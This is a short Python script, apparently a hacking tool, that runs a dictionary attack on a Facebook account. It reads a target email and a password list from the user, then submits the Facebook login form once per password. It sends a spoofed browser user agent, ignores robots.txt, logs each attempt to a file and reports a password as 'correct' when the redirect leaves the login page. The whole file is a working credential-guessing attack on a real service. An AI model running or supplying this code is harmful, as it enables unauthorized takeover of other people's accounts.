from mechanize import Browser
from bs4 import BeautifulSoup
import cookielib
import mechanize
import random
br = Browser()                                          cj = cookielib.LWPCookieJar()
br.set_handle_robots(False)                             br.set_handle_equiv(True)                               br.set_handle_referer(True)
br.set_handle_redirect(True)
br.set_cookiejar(cj)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
headers = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]                                     br.addheaders = [('User-agent', random.choice(headers))]
file = open("result.txt",'w')
def attack(email,liste):
    fille = open(liste,'r')
    for i in fille.readlines():
        i = i.rstrip("\n")                                      br.open("https://www.facebook.com/login.php?login_attempt=1")
        br.select_form(nr=0)
        br.form["email"] = email
        br.form["pass"] = i
        br.submit()
        file.write("trying password : "+i+" "+br.geturl()+"\n")
        f = br.geturl()
        if f[25:30] == "login" :
           r="not found"
        else :
           r="correct"
        print("trying password : "+i+" "+r)
email = str(raw_input("enter email : "))
liste = str(raw_input("enter list : "))
attack(email,liste)
